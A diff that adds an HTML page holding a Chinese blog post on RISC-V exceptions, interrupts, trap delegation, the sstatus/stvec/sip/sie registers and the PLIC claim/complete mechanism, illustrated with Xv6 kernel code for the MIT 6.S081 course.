@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>6.S081——补充材料——RISC-V架构中的异常与中断详解 - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">6.S081——补充材料——RISC-V架构中的异常与中断详解</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+        
+                <div id="content_views" class="markdown_views prism-tomorrow-night-eighties">
+                    
+                        
+                    
+                    <h1>
+<a id="0briefly_speaking_1"></a>0.briefly speaking</h1> 
+<p>我在阅读Xv6源码过程中对很多概念感到困惑，想到也许会有其他人对此秉持同样的困惑，所以我将我的研究和学习过程总结下来并编篡成如下的博客。本篇博客想对RISC-V标准中有关中断和异常的概念进行一个梳理，考虑RISC-V标准的实现灵活性，我们必须结合一个具体的平台来研究这个过程。这里我们选择了Xv6运行的平台——<mark>SiFive Unleashed</mark></p> 
+<p>本篇博客需要阅读的材料如下：</p> 
+<p>1.The RISC-V Instruction Set Manual Volume II: Privileged Architecture<br> 2.<a href="https://sifive.cdn.prismic.io/sifive/d3ed5cd0-6e74-46b2-a12d-72b06706513e_fu540-c000-manual-v1p4.pdf">SiFive Unleashed Document</a>（这篇手册较为完整地对开发板架构进行了介绍）<br> 3.<a href="https://github.com/riscv/riscv-plic-spec/blob/master/riscv-plic.adoc#interrupt-targets-and-hart-contexts">PLIC标准手册</a>(这篇手册完整地介绍了PLIC的细节)</p> 
+<p><b>由于Xv6运行在Supervisor模式下，所以本篇博客主要围绕S-模式下的寄存器展开</b>。<br> 这篇文章很长很长，读完可能需要很多耐心，所以请打开目录，寻找你想要了解的部分，细细地看。</p> 
+<h1>
+<a id="1RISCV_13"></a>1.RISC-V中的异常和中断概述</h1> 
+<h2>
+<a id="11__15"></a>1.1 基本概念与分类</h2> 
+<p>在RISC-V标准中，将<b>异常(exception)定义为当前CPU运行时遇到的<mark>与指令有关</mark>的不寻常情况</b>，而使用<b>中断(interrupt)定义为因为外部异步信号而引起的让控制流脱离当前CPU的事件</b>。而陷阱(trap)表示的则是，由异常或者中断引起的<mark>控制权转移到陷阱处理程序</mark>的过程。其实Xv6的定义和RISC-V的定义是相互兼容的，我们说在Xv6中有三种方式会触发陷阱：系统调用、中断和程序异常，其实系统调用中的<mark>ecall指令和程序执行中的异常都属于RISC-V标准中定义的异常情况</mark>，而<mark>设备中断则属于下面我们将要介绍的全局中断</mark>。</p> 
+<p>中断也可以进一步细分为两种情况，<b>一种是本地中断，一种是全局中断</b>。本地中断包括<mark>软件中断和定时器中断</mark>，它们由CLINT(Core-Local Interruptor, 核心本地中断器)来控制。另一种是<mark>外部设备引起的中断</mark>，也被称为全局中断，它们由PLIC(Platform-Level Interrupt Controller,平台级中断控制器)来控制。PLIC、CLINT和RISC-V核心的连接逻辑示意图如下：</p> 
+<p><img src="https://images2.imgbox.com/8c/dc/K57dBQQ3_o.png" alt="在这里插入图片描述"></p> 
+<p>而无论是异常还是中断，它们所导致的<mark>硬件陷阱</mark>流程都是一样的，具体来说有两个大动作：</p> 
+<p><mark>1.改变控制流</mark></p> 
+<ul><li>将PC的值保存在sepc寄存器中，而将stvec寄存器中保存的陷阱处理函数地址放入PC</li></ul> 
+<p><mark>2.更新相关CSR的值，有关这些寄存器的细节在下面进行详细解释</mark></p> 
+<ul>
+<li>sstatus</li>
+<li>stval</li>
+<li>scause</li>
+</ul> 
+<p>有关陷阱和优先级之间的交叉关系，可以参考这封<a href="https://groups.google.com/a/groups.riscv.org/g/sw-dev/c/-KQnN5EPHF4/m/Ua47avljCQAJ">问答邮件</a>，这封邮件得到了SiFive工程师的回复和认可，简单来说<b>当我们说一个X-Mode的异常时(X可以是U S M任何一种模式)，我们指的本质上是当异常发生时CPU正工作在X-Mode</b>。而<b>X-Mode的中断我们指的是，PLIC触发了一个必须由X-Mode响应的中断，CPU并不一定需要正在工作在此模式下</b>。时钟中断作为一种特例，在RISC-V处理器中被硬连线为一个M-Mode的中断，这也就是说它必须由M模式下的interrupt handler响应，当然这是后话，我们会在后面重提。</p> 
+<h1>
+<a id="2_36"></a>2.陷阱的委派</h1> 
+<p>事实上，在RISC-V的标准定义中，所有陷阱<mark>默认都是由机器模式(M-mode)来处理的</mark>。然而，在支持操作系统的设备上往往都实现了<mark>监管者模式(S-Mode)</mark>，如果按照默认模式发生中断则应该<b>首先陷入M-Mode下的中断处理程序，然后触发一个S-Mode下的中断再mret回S-Mode下处理</b>，这个过程过于繁琐且需要程序员自己实现，所以：</p> 
+<p>RISC-V标准为了应对这种情况提出了陷阱委派机制。也就是说在M-Mode下可以配置寄存器，从而使得S-Mode下的所有陷阱都被<mark>S-Mode下的陷阱处理函数自动接管</mark>。有两个寄存器，<mark>medeleg和mideleg，分别用来管理异常和中断的委派</mark>。</p> 
+<p>首先是medeleg寄存器，它的示意图如下所示，当要把特定的异常委托给S-Mode时，只需要将mcause寄存器中对应数值位置的比特位置1即可，参考下面的表格。比如当<mark>把系统调用委托给S-Mode时</mark>，因为它对应的Exception Code是8，那么<mark>只需要将此寄存器中第8位置为1即可</mark>。</p> 
+<p><img src="https://images2.imgbox.com/f9/02/rZPkBKTc_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/e2/a9/9KGQLBjN_o.png" alt="在这里插入图片描述"><br> 注意，<mark>M-Mode下发生异常，即使它被托管到S-Mode，这个异常也不会被移交给S-Mode去处理，而是在M-Mode完成处理</mark>。这也就是RISC-V规范中所说的：Traps never transition from a more-privileged mode to a less-privileged mode(陷阱从不会从高优先级移交到低优先级)但是如果是发生在S-Mode下的异常，就会被S-Mode直接接管，不会再上交到M-Mode了，这被称为：traps may be taken horizontally(中断可以被水平接管)。</p> 
+<p>但是，如果一个属于S-Mode的中断<mark>从M-Mode委托给S-Mode</mark>（比方我们后面要看到的外部中断），这个中断<mark>在M-Mode下就会被屏蔽掉</mark>，一定要等到<mark>进入S-Mode时才会被处理</mark>。负责管理中断委派的是mideleg寄存器，示意图如下：<br> <img src="https://images2.imgbox.com/90/65/ghyyJvRo_o.png" alt="在这里插入图片描述"></p> 
+<p>这里有一些点值得澄清：在实现时，无论是在qemu还是在真正的Verilog实现中，所谓mideleg寄存器中<mark>M态下的本地中断（包括时钟中断和软中断）都是被硬连线直接连接到0的</mark>，所以委派时赋值全赋值为1只是出于方便，并不能真的把M-Mode下的本地中断交给S-Mode处理，关于这一点的讨论可以参见<a href="https://groups.google.com/a/groups.riscv.org/g/sw-dev/c/-KQnN5EPHF4/m/Ua47avljCQAJ">这封问答邮件</a>。<b>唯一可以被委派到S-Mode的中断是外部中断MEI，外部中断一旦被委派到S-Mode，PLIC就只会触发S-Mode下的中断挂起位sip.SEIP了</b>，我们在后面会看到更多细节。（注意，这里M-Mode下的<mark>本地中断在实现时不能实现委派是SiFive_Unleashed这块RISC-V平台的实现特例</mark>，具体情况要具体分析，也许以后电路设计不同了，结论就会有所改变，但在这里是成立的）。</p> 
+<p>所以其实时钟中断和软中断默认情况下都是M-Mode中断，这是由硬件实现决定的，可能你会问那么STI和SSI还有什么意义呢，反正它们也不会被触发。事实上，<b>它们被触发的唯一可能场景就是在M-Mode下的中断处理程序中被置位，然后通过mret回到S-Mode下再处理</b>。</p> 
+<p>在Xv6系统启动时，我们可以看到<b>它将中断和异常的处理权全部委派给了Supervisor模式</b>，对应的代码在start函数中(kernel/start.c:19)：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span>
+<span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{<!-- --></span>
+	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token comment">// delegate all interrupts and exceptions to supervisor mode.</span>
+  	<span class="token function">w_medeleg</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  	<span class="token function">w_mideleg</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>在start函数中，通过直接向上述两个寄存器写入全1，实现了外部中断和异常的委派。这也就意味着，在Xv6系统中发生的外部中断和异常(<b>不包括时钟中断和软中断，它们默认被硬连线到M-Mode中断</b>)都将会被S-Mode下的操作系统接管，<mark>不会呈递到M-Mode来处理</mark>。所以接下来，我们的注意力主要放在S-Mode下的相关寄存器上。</p> 
+<h1>
+<a id="3sstatus_68"></a>3.sstatus寄存器</h1> 
+<p>sstatus寄存器的<mark>全称是supervisor status register</mark>，顾名思义，它是用来反映S-Mode下处理器的工作状态的。当执行RV64时，sstatus寄存器的示意图如下所示：<br> <img src="https://images2.imgbox.com/97/37/5V8YBy7n_o.png" alt="在这里插入图片描述"><br> 在sstatus寄存器中与异常和中断有关的位有SPP、SIE、SPIE，下面一个一个来看。</p> 
+<h2>
+<a id="31_SPP_73"></a>3.1 SPP位</h2> 
+<p>SPP记录的是在进入S-Mode之前处理器的特权级别，<mark>为0表示陷阱源自用户模式(U-Mode)</mark>，为1表示其他模式。当执行一个陷阱时，SPP会由硬件自动<mark>根据当前处理器所处的状态自动设置为0或者1</mark>。当执行SRET指令从陷阱中返回时，如果SPP位为0，那么处理器将会返回U-Mode，为1则会返回S-Mode，最后无论如何，SPP都被设置为0。</p> 
+<h2>
+<a id="32_SIE_76"></a>3.2 SIE位</h2> 
+<p>SIE位是S-Mode下中断的总开关，就像是一个总电闸。如果SIE位置为0，那么<mark>无论在S-Mode下发生什么中断，处理器都不会响应</mark>。但是<b>如果当前处理器运行在U-Mode，那么这一位不论是0还是1，S-Mode下的中断都是默认打开的</b>。也就是说在任何时候<mark>S-Mode都有权因为自己的中断而抢占位于U-Mode下的处理器</mark>，这一点要格外注意。想想定时器中断而导致的CPU调度，事实上这种设计是非常合理的。</p> 
+<p>所以SIE位是<b>S-Mode下的</b>总开关，而不是任何情况下的总开关，真正完全负责禁用或者启用特定中断的位，都在sie寄存器里呢，下面再详细解释。</p> 
+<h2>
+<a id="33_SPIE_80"></a>3.3 SPIE位</h2> 
+<p>SPIE位记录的是在<mark>进入S-Mode之前S-Mode中断是否开启</mark>。当进入陷阱时，硬件会<mark>自动将SIE位放置到SPIE位上</mark>，相当于起到了记录原先SIE值的作用，并最后将SIE置为0，表明<mark>硬件不希望在处理一个陷阱的同时被其他中断所打扰，也就是从硬件的实现逻辑上来说不支持嵌套中断</mark>(即便如此，我们还是可以手动打开SIE位以支持嵌套中断，笑)。当使用SRET指令从S-Mode返回时，SPIE的值<mark>会重新放置到SIE位上来恢复原先的值</mark>，并且将SPIE的值置为1。</p> 
+<h2>
+<a id="34__83"></a>3.4 进一步说明</h2> 
+<p>关于RISC-V中位于不同特权模式下的响应问题，标准中有进一步的说明：</p> 
+<p>当一个处理器在特权模式x(x = U or S or M)运行时，xIE控制着这个模式下的中断总开关。<b>对于更低优先级的中断来说，是默认全部禁用的，而对于更高优先级的中断来说是默认全部打开的</b>。这意味着<mark>在任何时候高优先级都拥有着对处理器的抢占权，而低优先级则被强行剥夺打断高优先级的权力</mark>。</p> 
+<p>那么用户难道对这种机制无能为力，只能任凭高优先级随意打断低优先级模式吗？其实也不是，标准上说可以通过<mark>禁用某种特定的中断，使得对应的中断发生时，低优先级的运行不受影响，这是通过设置mie或sie寄存器实现的</mark>。(Higher-privilege-level code can use separate per-interrupt enable bits to disable selected higher-privilege-mode interrupts before ceding control to a lower-privilege mode.)</p> 
+<p>另外，RISC-V<mark>在硬件层面上来说不支持陷阱的嵌套</mark>，硬件只假设最理想的情况，即：</p> 
+<p><b>发生陷阱-&gt;处理它(在此期间完全不发生其他陷阱)-&gt;恢复到原先状态。</b></p> 
+<p>所以在sstatus寄存器中只保留了一位用来存储上一个状态的SPP和SPIE位，事实上我们<mark>完全可以支持嵌套</mark>，只不过<mark>要提供更多的软件支持</mark>。最重要的也就是，<mark>使用处理器的软件堆栈来保存sstatus等寄存器的值</mark>，等到陷阱返回时再恢复之。我们可以看到kerneltrap函数中的逻辑实现了这一点(kernel/trap.c:131):</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> 
+<span class="token function">kerneltrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{<!-- --></span>
+  <span class="token keyword">int</span> which_dev <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token comment">// 保存相关寄存器sepc、sstatus、scause的值</span>
+  uint64 sepc <span class="token operator">=</span> <span class="token function">r_sepc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  uint64 sstatus <span class="token operator">=</span> <span class="token function">r_sstatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  
+  <span class="token comment">// 中间代码略...</span>
+
+  <span class="token comment">// the yield() may have caused some traps to occur,</span>
+  <span class="token comment">// so restore trap registers for use by kernelvec.S's sepc instruction.</span>
+  <span class="token comment">// 恢复相应寄存器的值</span>
+  <span class="token function">w_sepc</span><span class="token punctuation">(</span>sepc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">w_sstatus</span><span class="token punctuation">(</span>sstatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>但是Xv6对于嵌套中断的支持也就到此为止，不支持更多层的嵌套中断了，在上述的代码中<mark>并没有再次打开中断的操作</mark>。</p> 
+<h1>
+<a id="4stvec_116"></a>4.stvec寄存器</h1> 
+<p>stvec寄存器的全称是supervisor trap vector base address register(S态陷阱向量基址寄存器，stvec)，它的示意图如下：<br> <img src="https://images2.imgbox.com/83/a4/X13rjDLZ_o.png" alt="在这里插入图片描述"><br> 可以看到stvec寄存器分为两个域，分别是BASE域和MODE域，下面我们再分别来仔细研究一下这两个域。</p> 
+<h2>
+<a id="41_MODE_121"></a>4.1 MODE域</h2> 
+<p>在RISC-V标准的定义中，MODE域可能的取值有如下三种：<br> <img src="https://images2.imgbox.com/d2/30/GJFlMoFq_o.png" alt="在这里插入图片描述"><br> 可以看到，MODE域的取值影响了<mark>发生陷阱时要跳转到的地址</mark>。之前我们为了描述的方便，一般简单地说stvec中<mark>存放着中断处理程序的地址</mark>，发生陷阱时会直接跳转到。但其实stvec寄存器中不仅仅是中断处理程序的地址，还存放着MODE域的值。</p> 
+<ul>
+<li>当BASE域为0时，所有的陷阱全部<mark>跳转到BASE地址指向的程序入口</mark>
+</li>
+<li>当BASE域为1时，<b>同步中断(指因为指令而引起的异常)还是会跳转到BASE地址处</b>，而非同步中断(指由外部信号引起的中断)则会跳转到<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
+      
+       
+        
+        
+          B 
+         
+        
+          A 
+         
+        
+          S 
+         
+        
+          E 
+         
+        
+          + 
+         
+        
+          4 
+         
+        
+          × 
+         
+        
+          c 
+         
+        
+          a 
+         
+        
+          u 
+         
+        
+          s 
+         
+        
+          e 
+         
+        
+       
+         BASE + 4 times cause 
+        
+       
+     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.7667em;vertical-align: -0.0833em"></span><span class="mord mathnormal" style="margin-right: 0.0502em">B</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right: 0.0576em">SE</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.2222em"></span></span><span class="base"><span class="strut" style="height: 0.7278em;vertical-align: -0.0833em"></span><span class="mord">4</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right: 0.2222em"></span></span><span class="base"><span class="strut" style="height: 0.4306em"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal">u</span><span class="mord mathnormal">se</span></span></span></span></span>的地方，这里手册上举了一个例子：如果我们<mark>将MODE设置为Vectored状态</mark>，同时触发了一个S-Mode定时器中断(中断号为5)，则程序会跳转到<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
+      
+       
+        
+        
+          B 
+         
+        
+          A 
+         
+        
+          S 
+         
+        
+          E 
+         
+        
+          + 
+         
+        
+          4 
+         
+        
+          × 
+         
+        
+          5 
+         
+        
+          = 
+         
+        
+          B 
+         
+        
+          A 
+         
+        
+          S 
+         
+        
+          E 
+         
+        
+          + 
+         
+        
+          0 
+         
+        
+          x 
+         
+        
+          14 
+         
+        
+       
+         BASE + 4 times 5 = BASE + 0x14 
+        
+       
+     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.7667em;vertical-align: -0.0833em"></span><span class="mord mathnormal" style="margin-right: 0.0502em">B</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right: 0.0576em">SE</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.2222em"></span></span><span class="base"><span class="strut" style="height: 0.7278em;vertical-align: -0.0833em"></span><span class="mord">4</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right: 0.2222em"></span></span><span class="base"><span class="strut" style="height: 0.6444em"></span><span class="mord">5</span><span class="mspace" style="margin-right: 0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em"></span></span><span class="base"><span class="strut" style="height: 0.7667em;vertical-align: -0.0833em"></span><span class="mord mathnormal" style="margin-right: 0.0502em">B</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right: 0.0576em">SE</span><span class="mspace" style="margin-right: 0.2222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.2222em"></span></span><span class="base"><span class="strut" style="height: 0.6444em"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">14</span></span></span></span></span>的位置。</li>
+</ul> 
+<h2>
+<a id="42_BASE_129"></a>4.2 BASE域</h2> 
+<p>BASE域存放着一个基地址，在Direct模式或者是Vectored模式下的同步陷阱情况下，它都指向中断处理程序的地址(这里的地址<mark>可以是虚拟地址，也可以是物理地址</mark>，当然在Xv6的语境下绝大部分都指的是虚拟地址)。</p> 
+<p>在Vectored模式的非同步陷阱的情况下，比如由外部中断引起的陷阱时，它是<mark>中断服务程序的基址</mark>，加上一个特定偏移量之后才可以对应到对应的中断处理程序。</p> 
+<p>另外，BASE域有额外的限制因素，它必须是<mark>4-字节对齐的(4-byte aligned)</mark>。所以其实我们可以看到在Xv6的代码实现中，无论是在trampoline.S还是kernelvec.S的汇编代码实现中，在代码的头部总有：</p> 
+<pre><code class="prism language-shell">.align <span class="token number">4</span>
+</code></pre> 
+<p>这就是为了让代码文件按照4字节对齐，从而<mark>满足了stvec寄存器的写入需求</mark>。</p> 
+<h1>
+<a id="5sipsie_140"></a>5.sip与sie寄存器</h1> 
+<p>sip与sie这两个寄存器与中断的处理密切相关，在手册对应的部分不仅有关于这两个寄存器的说明。而且还有大量有关中断机制的细节描述，接下来的各个小段都是从RISC-V标准中阅读得到的总结，在此做一个详细记录。</p> 
+<p>sip与sie都是处理器与中断有关的寄存器，它们合称(Supervisor Interrupt Registers，S-Mode中断寄存器)，sip专门<mark>用来记载挂起的中断位</mark>，sie专门用来<mark>记载使能的中断位</mark>，它们的示意图如下：</p> 
+<p><img src="https://images2.imgbox.com/25/d7/7JYktOKL_o.png" alt="在这里插入图片描述"><br> 在RV-64标准中，这两个寄存器都是64位大小的。 <mark>标准中断只占据了这两个寄存器的低16位(15:0)</mark>，更高的位都被保存下来以作为扩展用途。和medeleg和mideleg寄存器的用法差不多，<b>将中断号对应的位在这两个寄存器中置位</b>即可，如下图所示：<br> <img src="https://images2.imgbox.com/50/dd/iJymk8Vu_o.png" alt="在这里插入图片描述"></p> 
+<p>如果我们想<mark>触发一个S-Mode下的软件中断</mark>，因为它的异常编号是1(见上表)，则<mark>只需要在sip中将第1位设置为1即可</mark>，sie寄存器的使用方法也是一样的，它表示的是对应编号的中断是否使能。</p> 
+<h2>
+<a id="51__151"></a>5.1 中断被呈递到何种特权模式下处理？</h2> 
+<p>这是一个非常重要的话题，在RISC-V处理器中的<mark>三种特权模式来回切换让人眼花缭乱</mark>，而它们又与对应模式下的中断紧密联系在一起，再加上我们上面说的陷阱委托机制，让整个RISC-V架构的<mark>陷阱与特权模式对应关系非常混乱</mark>。幸好，RISC-V标准中明确说明了中断应该被放在哪种特权模式下处理的对应原则：</p> 
+<p><b>1.当下述条件a) b) c)全部满足时，中断一定要在M-Mode下处理</b>：<br> a) 当前特权级别为M-Mode且mstatus中的MIE打开，或当前特权级别低于M-Mode(<mark>中断总开关打开</mark>)<br> b) mip与mie中的第i位都被设置为1(<mark>表明中断待处理且使能位打开</mark>)<br> c) mideleg寄存器存在，且第i位没有被设置(<mark>中断没有被委托给S-Mode</mark>)</p> 
+<p>所以，经过上面的陷阱委托机制，这里彻底将外部中断的c)条件破坏了。</p> 
+<p><b>2.当下述条件a)b)同时满足时，中断一定要在S-Mode下处理</b><br> a) 当前特权级别为S-Mode且sstatus中的SIE打开，或当前特权级别低于S-Mode(<mark>中断总开关打开</mark>)<br> b) sip与sie中的第i位都被设置为1(<mark>表明中断待处理且使能位打开</mark>)</p> 
+<p>经过这些原则的约束，可以很清楚的知道在Xv6中发生的中断都<mark>一定会被呈递到S-Mode下进行处理</mark>，而S-Mode正好对应到操作系统级别，所以这种对应关系是符合标准的。</p> 
+<h2>
+<a id="52__167"></a>5.2 响应中断的时机</h2> 
+<p>在RISC-V标准中有关sip和sie寄存器的介绍中，手册中有这样一段话：</p> 
+<p>These conditions for an interrupt trap to occur must be evaluated in a bounded amount of time<br> from when an interrupt becomes, or ceases to be, pending in sip, and must also be evaluated<br> immediately following the execution of an SRET instruction or an explicit write to a CSR on which<br> these interrupt trap conditions expressly depend (including sip, sie and sstatus).</p> 
+<p>译：这些中断陷阱发生的条件(指上述5.1节中的条件)，必须在一个中断在sip中被置位或清除后的一段时间内得到检测。 并且在紧跟着SRET指令之后，或对CSR寄存器中与中断陷阱条件有关的寄存器(包括sie、sip、sstatus)进行<mark>显式写入之后立即检测</mark>。</p> 
+<p>这就是标准中<mark>有关中断检测时机的描述</mark>，具体的实现可能和芯片的微体系结构有关，但现在我们可以假定在上述动作完成之后，就会进入中断的条件检测，而一旦条件满足就开始响应中断。</p> 
+<h2>
+<a id="53_claimcomplete_179"></a>5.3 外部中断、claim/complete机制(重点)</h2> 
+<p>sip寄存器中的每一位在实现时，可以是<mark>可读可写的</mark>，也可以是<mark>只读的</mark>，也就是说这里RISC-V标准并没有对SIP寄存器的读写性加以严格的约束。但是后面标准中提到，如果sip寄存器中的位可写，那么<mark>清除某个特定中断的操作就是向它的对应位写入0即可</mark>。但如果sip寄存器是只读的，那么必须提供其他机制来实现对sip对应位的清零，具体怎么实现则要看微处理器的具体构成和实现。注意，这里所说的只读(read-only)只是说，我们<mark>不能用指令的形式去有效地清除对应的pending bit</mark>，但绝非没有硬件电路能去改变它，我们下面就会看到是怎么做的了。</p> 
+<p>对应的，sie作为sip对应的使能位，<mark>如果一个中断可以被挂起，那么它对应的sie位一定是可写的</mark>。但<b>如果对应的位在sip中没有对应，那么sie对应的位就不能写入，而是只读的0(read-only zero)</b>。<br> <img src="https://images2.imgbox.com/50/dd/iJymk8Vu_o.png" alt="在这里插入图片描述"><br> 上述寄存器中负责控制<mark>外部中断</mark>的位有sip.SEIP和sie.SEIE这两个位，在一般的处理器中sip.SPIE就会被实现为只读的(read-only)，它的清除与置位操作一般会直接交给<mark>特定平台的中断控制器</mark>来做。在Xv6运行的SiFive Unleashed开发板上，处理外部中断的就是PLIC这个<mark>负责管理全局外部中断的IP核</mark>。CPU核心只需要对sip.SEIP进行读取即可知道是否有外部中断挂起。</p> 
+<p>这里我们直接顺势对PLIC和中断处理流程做出延伸，打开SiFive的开发板手册，找到关于Interrupts一章的概述。我们可以看到这一章的开头就对开发板的PLIC做出了描述：</p> 
+<p>Global interrupts, by contrast, are routed through a Platform-Level Interrupt Controller (PLIC),<br> which can direct interrupts to any hart in the system via the external interrupt. Decoupling global<br> interrupts from the hart(s) allows the design of the PLIC to be tailored to the platform, permitting<br> a broad range of attributes like the number of interrupts and the prioritization and routing<br> schemes.</p> 
+<p>(译：相比之下，全局中断通过平台级中断控制器(PLIC)进行路由，PLIC可以通过外部中断将中断引导到系统中的任何hart。将全局中断与hart<mark>解耦</mark>，可以根据平台定制PLIC的设计，允许广泛的属性，如中断数量、优先级和路由方案)。</p> 
+<p>所以其实PLIC这样的中断控制器的引入是为了<mark>更加灵活地对外部中断进行管理</mark>，使得开发板有更好的适应性与可裁剪性。就像本科时我们学过的微机原理，8059A也就是8086的中断控制器一样，可以对外部中断进行更好的管理，在我们的SiFive开发板上一共支持<mark>53个13大类外部设备中断</mark>，它们预留的ID范围如下图所示。这么多的中断其实都属于外部中断，但是它们在RISC-V的CPU中其实只有一个sip.SEIP和sie.SEIE两个位对应。所以，我们也不得不用一个强大的PLIC核心去细化和丰富对外部设备中断的管理过程。</p> 
+<p><img src="https://images2.imgbox.com/04/ed/vOUcnYVG_o.png" alt="在这里插入图片描述"><br> 在更加深入地对中断进行介绍之前，我们还要对PLIC的claim/completion机制进行解释。让我们回顾一下PLIC与RISC-V核心之间的连接关系，一个PLIC本质上连接了多个RISC-V核心。当一个外部设备发出中断请求时，经过PLIC中的Interrupt Gateways的信号转换等操作，其实PLIC会<mark>将这个中断转发给多个核心</mark>(前提是对应核心中sie寄存器中对应位是打开的)，这个操作叫做interrupt notification，本质是<mark>PLIC将对应核心sip寄存器中的对应位置位</mark>。</p> 
+<p>这个notification操作在简单系统的硬件实现中，是通过将PLIC核心中的<mark>PIE位硬连线到对应的sip.SEIP寄存器位</mark>来实现的，而在复杂的系统中是通过复杂的片上路由网络实现的。在外部中断全部被委派到S-Mode的条件下，它<mark>只会</mark>导致多个核心中的sip.SEIP位置位(The notification only appear in lower-privilege xip registers if external interrupts have been delegated to the lower-privilege modes, quoted from PLIC doc)。根据我们之前5.2节中触发中断的条件，<mark>多个核心或早或晚会这个对挂起的中断进行响应</mark>。那么，多个核心之间其实就已经有了对中断响应的竞争。</p> 
+<p><img src="https://images2.imgbox.com/e7/44/K0e7eIch_o.png" alt="在这里插入图片描述"><br> 一个核心如何对interrupt notification进行响应呢？这个操作我们叫做claim操作，本质就是一个简单的<mark>对claim/complete寄存器的读操作</mark>，claim/complete寄存器会保存一个<b>当前未被处理且具有最高优先级的中断的ID号</b>。CPU读取claim/complete寄存器就可以获得这个ID号，同时也就完成了对此中断的claim操作，回到内核中就可以<mark>匹配对应的中断处理程序(interrupt handler)</mark>进行对应的处理。在Xv6的内核代码中，很好地体现了这种逻辑(kernel/trap.c:185)。</p> 
+<pre><code class="prism language-c"><span class="token keyword">int</span> irq <span class="token operator">=</span> <span class="token function">plic_claim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>irq <span class="token operator">==</span> UART0_IRQ<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+      <span class="token function">uartintr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>irq <span class="token operator">==</span> VIRTIO0_IRQ<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+      <span class="token function">virtio_disk_intr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>irq<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"unexpected interrupt irq=%dn"</span><span class="token punctuation">,</span> irq<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre> 
+<p>当一个中断的notification被claim后(也就是claim/complete寄存器被读取后)，PLIC核心会<mark>自动清除掉对应中断源在PLIC中的挂起位(clear down the corresponding source’s IP bit)</mark>，表示这个中断已经被处理了。</p> 
